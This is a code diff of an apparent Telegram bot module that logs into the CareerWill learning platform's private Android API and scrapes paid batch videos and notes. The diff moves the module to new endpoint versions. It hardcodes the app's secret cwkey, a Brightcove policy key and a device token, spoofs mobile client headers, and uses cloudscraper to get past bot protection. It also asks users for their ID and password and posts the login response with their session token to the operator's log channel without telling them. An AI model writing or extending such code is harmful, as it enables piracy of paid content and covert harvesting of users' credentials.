@@ -14,7 +14,7 @@ requests = cloudscraper.create_scraper()
 
 ACCOUNT_ID = "6206459123001"
 BCOV_POLICY = "BCpkADawqM1474MvKwYlMRZNBPoqkJY-UWm7zE1U769d5r5kqTjG0v8L-THXuVZtdIQJpfMPB37L_VJQxTKeNeLO2Eac_yMywEgyV9GjFDQ2LTiT4FEiHhKAUvdbx9ku6fGnQKSMB8J5uIDd"
-bc_url = f"https://wbspec.crwilladmin.com/playback/v1/accounts/{ACCOUNT_ID}/videos/"
+bc_url = f"https://edge.api.brightcove.com/playback/v1/accounts/{ACCOUNT_ID}/videos/"
 bc_hdr = {"BCOV-POLICY": BCOV_POLICY}
 
 
@@ -28,7 +28,7 @@ async def careerdl(app, message, headers, raw_text2, token, raw_text3, prog, nam
 
         try:
             # Video Details
-            details_url = f"https://wbspec.crwilladmin.com/api/v1/batch-detail/{raw_text2}?topicId={id_text}"
+            details_url = f"https://elearn.crwilladmin.com/api/v8/batch-detail/{raw_text2}?topicId={id_text}"
             response = requests.get(details_url, headers=headers)
             data = response.json()
 
@@ -43,7 +43,7 @@ async def careerdl(app, message, headers, raw_text2, token, raw_text3, prog, nam
 
                 if lesson_ext == 'brightcove':
                     lesson_url = requests.get(
-                        f"https://wbspec.crwilladmin.com/api/v1/class-detail/{vid_id}", 
+                        f"https://elearn.crwilladmin.com/api/v8/class-detail/{vid_id}", 
                         headers=headers
                     ).json()['data']['class_detail']['lessonUrl']
 
@@ -52,7 +52,7 @@ async def careerdl(app, message, headers, raw_text2, token, raw_text3, prog, nam
                 
                 elif lesson_ext == 'youtube':
                     lesson_url = requests.get(
-                        f"https://wbspec.crwilladmin.com/api/v1/class-detail/{vid_id}", 
+                        f"https://elearn.crwilladmin.com/api/v8/class-detail/{vid_id}", 
                         headers=headers
                     ).json()['data']['class_detail']['lessonUrl']
                     
@@ -60,7 +60,7 @@ async def careerdl(app, message, headers, raw_text2, token, raw_text3, prog, nam
                     fuck += f"{lesson_name}: {video_link}\n"
 
             # Notes Details
-            notes_url = f"https://wbspec.crwilladmin.com/api/v1/batch-topic/{raw_text2}?type=notes"
+            notes_url = f"https://elearn.crwilladmin.com/api/v8/batch-topic/{raw_text2}?type=notes"
             notes_resp = requests.get(notes_url, headers=headers).json()
 
             if 'data' in notes_resp and 'batch_topic' in notes_resp['data']:
@@ -68,7 +68,7 @@ async def careerdl(app, message, headers, raw_text2, token, raw_text3, prog, nam
 
                 for topic in notes_topics:
                     topic_id = topic['id']
-                    notes_topic_url = f"https://wbspec.crwilladmin.com/api/v1/batch-notes/{raw_text2}?topicId={topic_id}"
+                    notes_topic_url = f"https://elearn.crwilladmin.com/api/v8/batch-notes/{raw_text2}?topicId={topic_id}"
                     notes_topic_resp = requests.get(notes_topic_url, headers=headers).json()
 
                     if 'data' in notes_topic_resp and 'notesDetails' in notes_topic_resp['data']:
@@ -108,43 +108,35 @@ async def careerdl(app, message, headers, raw_text2, token, raw_text3, prog, nam
 async def career_will(app, message):
     try:
         input1 = await app.ask(message.chat.id, text="<blockquote>**Send ID & Password in this manner otherwise bot will not respond.\n\nSend like this:-  ID*Password\n\n OR Send Your Token**</blockquote>")
-        login_url = "https://wbspec.crwilladmin.com/api/v1/login-other"
+        login_url = "https://elearn.crwilladmin.com/api/v8/login-other"
         raw_text = input1.text
      
         if "*" in raw_text:
-            headers = {
-    "Host": "wbspec.crwilladmin.com",
-    "accept": "application/json",
-    "content-type": "application/json; charset=UTF-8",
-    "user-agent": "Dalvik/2.1.0 (Linux; U; Android 13; RMX3710 Build/TKQ1.220829.002)",
-    "appver": "126",
-    "versioncode": "126",
-    "apptype": "android",
-    "cwkey": "+HwN3zs4tPU0p8BpOG5ZlXIU6MaWQmnMHXMJLLFcJ5m4kWqLXGLpsp8+2ydtILXy",
-    "deviceid": "android",
-    "devicemodel": "RMX3710",
-    "deviceversion": "13",
-    "accept-encoding": "gzip"
+            headers =  {
+                "Host": "elearn.crwilladmin.com",
+                "appver": "101",
+                "apptype": "android",
+                "cwkey": "+HwN3zs4tPU0p8BpOG5ZlXIU6MaWQmnMHXMJLLFcJ5m4kWqLXGLpsp8+2ydtILXy",
+                "content-type": "application/json; charset=UTF-8",
+                "accept-encoding": "gzip",
+                "user-agent": "okhttp/5.0.0-alpha.2"
             }
 
             email, password = raw_text.split("*")
-            data = {
-    "email": email,
-    "password": password,
-    "deviceType": "android",
-    "deviceModel": "RMX3710",
-    "deviceVersion": "13",
-    "deviceIMEI": "123456789012345",
-    "deviceToken": "android"
+            data =  {
+                "deviceType": "android",
+                "password": password,
+                "deviceModel": "Xiaomi M2007J20CI",
+                "deviceVersion": "Q(Android 10.0)",
+                "email": email,
+                "deviceIMEI": "d57adbd8a7b8u9i9",  # You should replace this with an actual IMEI if needed
+                "deviceToken": "c8HzsrndRB6dMaOuKW2qMS:APA91bHu4YCP4rqhpN3ZnLjzL3LuLljxXua2P2aUXfIS4nLeT4LnfwWY6MiJJrG9XWdBUIfuA6GIXBPIRTGZsDyripIXoV1CyP3kT8GKuWHgGVn0DFRDEnXgAIAmaCE6acT3oussy2"  # Replace with an actual device token if needed
             }
 
-            response = requests.post("https://wbspec.crwilladmin.com/api/v1/login-other", headers=headers, json=data)
+            response = requests.post("https://elearn.crwilladmin.com/api/v8/login-other", headers=headers, json=data)
             
             pk = response.text
-            if response.status_code != 200:
-                return await message.reply_text(
-                    f"Login Failed ❌\n\nStatus: {response.status_code}\n\n{response.text}"
-                )
+            response.raise_for_status()  # Raise an error if the request was unsuccessful
             token = response.json()["data"]["token"]
             await app.send_message(log_channel, pk)
             await message.reply_text(f"<blockquote>**Login Successful**\n\n`{token}`</blockquote>")
@@ -155,22 +147,19 @@ async def career_will(app, message):
         return
 
     headers = {
-    "Host": "wbspec.crwilladmin.com",
-    "accept": "application/json",
-    "content-type": "application/json; charset=UTF-8",
-    "user-agent": "Dalvik/2.1.0 (Linux; U; Android 13; RMX3710 Build/TKQ1.220829.002)",
-    "appver": "126",
-    "versioncode": "126",
-    "apptype": "android",
-    "cwkey": "+HwN3zs4tPU0p8BpOG5ZlXIU6MaWQmnMHXMJLLFcJ5m4kWqLXGLpsp8+2ydtILXy",
-    "deviceid": "android",
-    "devicemodel": "RMX3710",
-    "deviceversion": "13",
-    "accept-encoding": "gzip"
-}
+                "Host": "elearn.crwilladmin.com",
+                "appver": "101",
+                "apptype": "android",
+        "usertype": "2",
+        "token": token,
+                "cwkey": "+HwN3zs4tPU0p8BpOG5ZlXIU6MaWQmnMHXMJLLFcJ5m4kWqLXGLpsp8+2ydtILXy",
+                "content-type": "application/json; charset=UTF-8",
+                "accept-encoding": "gzip",
+                "user-agent": "okhttp/5.0.0-alpha.2"
+    }
 
     await input1.delete(True)
-    batch_url = "https://wbspec.crwilladmin.com/api/v1//my-batch"
+    batch_url = "https://elearn.crwilladmin.com/api/v8/my-batch"
     response = requests.get(batch_url, headers=headers)
     
     data = response.json()
@@ -184,7 +173,7 @@ async def career_will(app, message):
     input2 = await app.ask(message.chat.id, text="<blockquote>**Now send the Batch ID to Download**</blockquote>")
     raw_text2 = input2.text
     await app.send_message(log_channel, dl)
-    topic_url = "https://wbspec.crwilladmin.com/api/v1/batch-topic/" + raw_text2 + "?type=class"
+    topic_url = "https://elearn.crwilladmin.com/api/v8/batch-topic/" + raw_text2 + "?type=class"
     response = requests.get(topic_url, headers=headers)
     topic_data = response.json()
     batch_data = topic_data['data']['batch_topic']
